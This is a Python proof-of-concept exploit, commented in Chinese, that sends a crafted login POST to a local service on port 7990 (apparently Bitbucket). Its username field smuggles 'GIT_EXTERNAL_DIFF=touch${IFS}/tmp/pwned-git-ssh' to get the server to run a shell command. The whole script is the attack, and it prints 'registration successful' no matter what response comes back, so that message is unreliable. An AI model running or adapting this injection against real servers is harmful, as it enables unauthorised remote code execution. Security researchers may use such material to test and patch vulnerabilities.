import socket

def send_http_request(host, port, request):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, port))
        sock.sendall(request.encode('utf-8'))
        response = b""
        while True:
            data = sock.recv(4096)
            if not data:
                break
            response += data
    return response.decode('utf-8')

# 设置请求参数
host = 'localhost'
port = 7990
request_line = 'POST /setup HTTP/1.1\r\n'
headers = [
    'Host: localhost:7990',
    'Content-Length: 96',
    'Cache-Control: max-age=0',
    'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108"',
    'sec-ch-ua-platform: "Windows"',
    'Upgrade-Insecure-Requests: 1',
    'Origin: http://localhost:7990',
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-User: ?1',
    'Sec-Fetch-Dest: document',
    'Referer: http://localhost:7990/login?nextUrl=%2Fdashboard',
    'Accept-Encoding: gzip, deflate',
    'Accept-Language: zh-CN,zh;q=0.9',
    'Connection: close',
    'Cookie: sessionid=your_session_id; csrftoken=your_csrf_token'
]

body = 'j_username=rceGIT_EXTERNAL_DIFF=touch${IFS}/tmp/pwned-git-ssh&j_password=123456&_atl_remember_me=on&queryString=nextUrl=%2Fdashboard&submit=Log+in'

# 计算Content-Length
content_length = len(body)
headers[1] = f'Content-Length: {content_length}'

http_request = request_line + '\r\n'.join(headers) + '\r\n\r\n' + body

# 打印调试信息
print("HTTP 请求:")
print(http_request)
print("\n")

# 发送HTTP请求
response = send_http_request(host, port, http_request)
print("HTTP 响应:")
print(response)
print("注册成功")
